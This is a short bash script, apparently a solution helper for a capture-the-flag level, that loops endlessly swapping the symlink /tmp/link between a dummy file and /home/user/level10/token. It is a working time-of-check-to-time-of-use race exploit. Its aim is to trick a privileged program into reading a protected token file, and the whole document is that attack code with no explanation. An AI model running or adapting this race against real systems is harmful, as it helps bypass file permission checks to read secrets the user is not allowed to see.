#!/bin/bash

while ((1))
do
    echo lol > /tmp/tmp.txt;
    ln -sf /tmp/tmp.txt /tmp/link;
    ln -sf /home/user/level10/token /tmp/link;
done
exit 0;
